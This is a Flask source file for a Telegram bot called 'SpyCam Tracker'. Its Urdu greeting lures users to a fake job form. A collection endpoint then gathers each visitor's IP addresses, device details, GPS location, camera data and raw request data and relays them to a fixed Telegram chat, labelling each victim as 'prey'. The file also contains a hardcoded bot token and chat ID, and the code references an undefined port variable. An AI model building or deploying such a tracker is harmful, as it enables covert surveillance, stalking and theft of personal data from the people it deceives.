from flask import Flask, request, render_template
import requests

app = Flask(__name__)

BOT_TOKEN = "7816397892:AAF6GslyJpBOv-ax4t5FdR-NOSOjESW1jMg"
CHAT_ID = "6908281054"
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

@app.route(f"/{BOT_TOKEN}", methods=["POST"])
def webhook():
    data = request.json
    if "message" in data:
        chat_id = data["message"]["chat"]["id"]
        text = data["message"].get("text", "")

        if text == "/start":
            msg = (
                "👋 خوش آمدید Faizan™ SpyCam Tracker میں!\n\n"
                "📄 ایک اہم فارم بھریں تاکہ آپ کی تفصیل محفوظ ہو سکے:\n"
                "🔗 https://faizan-spybot.onrender.com/job"
            )
            requests.post(f"{API_URL}/sendMessage", data={"chat_id": chat_id, "text": msg})
    return "OK", 200

@app.route("/job")
def job_form():
    return render_template("spy.html")

@app.route("/collect", methods=["POST"])
def collect_data():
    data = request.json
    ip = request.remote_addr
    forwarded = request.headers.get("X-Forwarded-For", "")
    all_ips = f"{ip}, {forwarded}"

    message = (
        "👁️ شکار آیا!\n"
        f"🌐 IP Address: {all_ips}\n"
        f"📱 Device Info: {data.get('userAgent')}\n"
        f"📍 Location: {'https://www.google.com/maps?q=' + str(data.get('latitude')) + ',' + str(data.get('longitude')) if data.get('latitude') else '❌ Location Not Available'}\n"
        f"📷 Camera: {data.get('camera')}\n"
        f"🧠 Raw Data: {data}"
    )
    requests.post(f"{API_URL}/sendMessage", data={"chat_id": CHAT_ID, "text": message})
    return "OK", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=port)
